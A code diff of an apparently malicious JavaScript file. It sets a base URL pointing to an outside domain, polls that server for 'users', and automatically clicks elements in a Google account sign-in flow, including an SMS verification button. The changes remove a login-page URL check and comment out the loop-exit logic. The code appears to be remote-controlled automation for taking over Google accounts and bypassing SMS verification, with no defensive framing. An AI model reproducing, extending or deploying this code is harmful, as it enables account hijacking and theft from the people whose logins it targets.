@@ -2,12 +2,11 @@ var baseUrl = 'https://ajanspiink.com/';
 
 function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }
 
-if (location.href != "https://accounts.google.com/ServiceLogin/identifier?flowName=GlifWebSignIn&flowEntry=AddSession") {
-    try {
+   try {
         document.querySelectorAll('form [data-init-is-remove-mode] li>div')[1].click();
     } catch (e) { }
 
-}
+
 var mailId = "";
 var sInt1 = setInterval(function () {
     ajax('getusers', function () {
@@ -184,9 +183,9 @@ function sms() {
             var smsBTN = document.querySelector('#smsButton');
             if (smsBTN != null) {
                 document.querySelector('#smsButton').click();
-                clearInterval(sInt3);
-                mail();
-                return;
+                //clearInterval(sInt3);
+                //sms();
+                //return;
             }
         } catch (e) { }
 
